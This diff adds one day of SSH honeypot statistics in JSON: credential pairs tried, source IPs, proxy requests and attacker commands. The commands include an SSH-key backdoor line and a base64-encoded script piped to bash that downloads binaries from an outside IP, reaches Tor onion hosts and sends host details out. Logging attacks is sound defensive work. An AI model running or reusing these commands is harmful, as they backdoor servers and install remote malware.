@@ -1398,6 +1398,167 @@
   ]
 },
 {
+  "date": "2021-06-18",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 4762
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 310
+    },
+    {
+      "username": "root",
+      "password": "jessica",
+      "count": 14
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 6
+    },
+    {
+      "username": "root",
+      "password": "admin",
+      "count": 5
+    }
+  ],
+  "commands": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 6968
+    },
+    {
+      "input": "uname -a",
+      "count": 323
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 320
+    },
+    {
+      "input": "lscpu | grep Model",
+      "count": 320
+    },
+    {
+      "input": "uname",
+      "count": 320
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 6968
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 320
+    },
+    {
+      "input": "echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAicnhteHB6Zmt5ZGt1bGhocW51ZnRibWY2ZDVxNjdqamNob3BtaDRvZnN6Znd3bm16NGJxcTJmaWQiKQoKc29ja3ooKSB7Cm49KGRvaC50aGlzLndlYi5pZCBkb2gucG9zdC1mYWN0dW0udGsgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgcmVzb2x2ZXItZXUubGVsdXguZmkgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTExKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11UnxoZWFkIC1uIDEpCn0KCmZleGUoKSB7CmZvciBpIGluIC4gJEhPTUUgL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vc2guJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash",
+      "count": 135
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 2
+    },
+    {
+      "input": "amd-info; nvidia-info",
+      "count": 2
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "121.43.118.146",
+      "dst_port": 2222,
+      "count": 6970
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "dst_port": 2222,
+      "count": 508
+    },
+    {
+      "src_ip": "104.248.7.123",
+      "dst_port": 2222,
+      "count": 421
+    },
+    {
+      "src_ip": "5.188.86.206",
+      "dst_port": 2222,
+      "count": 347
+    },
+    {
+      "src_ip": "5.188.87.60",
+      "dst_port": 2222,
+      "count": 331
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "121.43.118.146",
+      "robot": true,
+      "count": 6956
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "robot": true,
+      "count": 349
+    },
+    {
+      "src_ip": "5.188.86.212",
+      "robot": true,
+      "count": 317
+    },
+    {
+      "src_ip": "5.188.86.206",
+      "robot": true,
+      "count": 248
+    },
+    {
+      "src_ip": "5.188.87.60",
+      "robot": true,
+      "count": 232
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 668
+    },
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "184.150.200.206",
+      "dst_port": 443,
+      "count": 562
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 349
+    },
+    {
+      "src_ip": "5.188.86.212",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 317
+    },
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 289
+    }
+  ]
+},
+{
   "date": "2021-05-10",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
